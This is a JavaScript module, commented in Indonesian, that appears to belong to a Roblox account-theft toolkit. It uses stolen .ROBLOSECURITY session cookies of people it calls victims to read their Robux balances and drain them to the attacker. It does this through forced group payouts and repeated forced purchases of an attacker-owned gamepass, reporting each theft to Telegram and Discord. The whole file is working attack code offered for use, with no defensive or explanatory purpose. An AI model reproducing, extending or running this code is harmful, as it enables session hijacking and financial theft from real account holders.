// robux.js
// transfer robux dari akun korban ke akun kamu
// metode: group payout (kalo korban owner group) atau marketplace sale (kalo kamu punya gamepass)
import axios from 'axios';
import 'dotenv/config';
import { getCookie } from './session.js';
import { notify } from './telegram.js';
import { sendDiscord } from './discord.js';

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';

function client(cookie) {
  return axios.create({
    headers: {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'User-Agent': UA,
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com',
      'Content-Type': 'application/json'
    },
    validateStatus: () => true
  });
}

async function getCsrf(c) {
  const r = await c.post('https://auth.roblox.com/v1/logout');
  return r.headers['x-csrf-token'];
}

async function getUserId(cookie) {
  const r = await axios.get('https://users.roblox.com/v1/users/authenticated', {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    validateStatus: () => true
  });
  return r.data?.id;
}

// --- cek saldo robux korban ---
export async function getBalance(username) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };
  const userId = await getUserId(cookie);
  const r = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}`, 'User-Agent': UA },
    validateStatus: () => true
  });
  return { ok: r.status === 200, balance: r.data?.robux };
}

// --- metode 1: group payout (kalo korban punya group) ---
export async function groupPayout(username, groupId, targetUserId, amount) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };
  const c = client(cookie);
  const csrf = await getCsrf(c);
  c.defaults.headers['X-CSRF-TOKEN'] = csrf;

  // step 1: cek korban owner group?
  const r0 = await c.get(`https://groups.roblox.com/v1/groups/${groupId}`);
  if (r0.status !== 200) return { ok: false, error: 'group not found' };
  const ownerId = r0.data?.owner?.userId;
  const myId = await getUserId(cookie);
  if (ownerId !== myId) return { ok: false, error: 'not group owner' };

  // step 2: cek saldo group
  const r1 = await c.get(`https://economy.roblox.com/v1/groups/${groupId}/currency`);
  const groupBalance = r1.data?.robux || 0;
  if (groupBalance < amount) return { ok: false, error: `group balance ${groupBalance} < ${amount}` };

  // step 3: payout
  const r2 = await c.post(`https://groups.roblox.com/v1/groups/${groupId}/payouts`, {
    PayoutType: 'FixedAmount',
    Recipients: [{ recipientId: targetUserId, recipientType: 'User', amount }]
  });

  const msg = `💰 Group payout: \`${username}\` → user \`${targetUserId}\` — R$ ${amount} — ${r2.status === 200 ? '✅' : '❌'}`;
  await notify(msg);
  await sendDiscord(msg);

  return { ok: r2.status === 200, data: r2.data };
}

// --- metode 2: marketplace sale (kamu bikin gamepass, korban beli) ---
// ini butuh korban punya robux DAN kamu punya gamepass
export async function sellGamepassToVictim(username, gamepassId, expectedPrice) {
  const cookie = getCookie(username);
  if (!cookie) return { ok: false, error: 'no cookie' };
  const c = client(cookie);
  const csrf = await getCsrf(c);
  c.defaults.headers['X-CSRF-TOKEN'] = csrf;

  // step 1: get product id
  const r1 = await c.get(`https://apis.roblox.com/game-passes/v1/game-passes/${gamepassId}/product-info`);
  if (r1.status !== 200) return { ok: false, error: 'gamepass not found' };
  const productId = r1.data?.ProductId;
  const price = r1.data?.PriceInRobux;

  // step 2: purchase
  const r2 = await c.post(`https://economy.roblox.com/v1/purchases/products/${productId}`, {
    expectedCurrency: 1,
    expectedPrice: expectedPrice ?? price,
    expectedSellerId: r1.data?.Creator?.Id
  });

  const msg = `🛒 Gamepass purchase: \`${username}\` bought gamepass \`${gamepassId}\` for R$ ${expectedPrice ?? price} — ${r2.status === 200 ? '✅' : '❌'}`;
  await notify(msg);
  await sendDiscord(msg);

  return { ok: r2.status === 200, data: r2.data };
}

// --- metode 3: auto transfer via gamepass (kamu siapin gamepass, korban beli) ---
export async function autoTransferViaGamepass(victimUsername, gamepassId, amount) {
  // korban beli gamepass → kamu dapet 70% dari nilai (roblox potong 30%)
  return sellGamepassToVictim(victimUsername, gamepassId, amount);
}

// --- drain full balance via gamepass ---
export async function drainFullBalance(victimUsername, gamepassId) {
  const bal = await getBalance(victimUsername);
  if (!bal.ok) return bal;
  if (bal.balance < 1) return { ok: false, error: 'balance 0' };

  // max 1000 per purchase (roblox limit)
  const remaining = bal.balance;
  let totalDrained = 0;
  const results = [];

  while (totalDrained < remaining) {
    const chunk = Math.min(1000, remaining - totalDrained);
    const r = await sellGamepassToVictim(victimUsername, gamepassId, chunk);
    results.push(r);
    if (!r.ok) break;
    totalDrained += chunk;
    await new Promise(res => setTimeout(res, 2000));
  }

  const msg = `💸 Drain complete: \`${victimUsername}\` — R$ ${totalDrained} dari R$ ${remaining}`;
  await notify(msg);
  await sendDiscord(msg);

  return { ok: true, drained: totalDrained, total: remaining, results };
}

// --- metode 4: group funds (kalo korban owner group dengan funds) ---
export async function drainGroupFunds(victimUsername, groupId, targetUserId) {
  const cookie = getCookie(victimUsername);
  if (!cookie) return { ok: false, error: 'no cookie' };

  const r = await groupPayout(victimUsername, groupId, targetUserId, 999999999);
  return r;
}
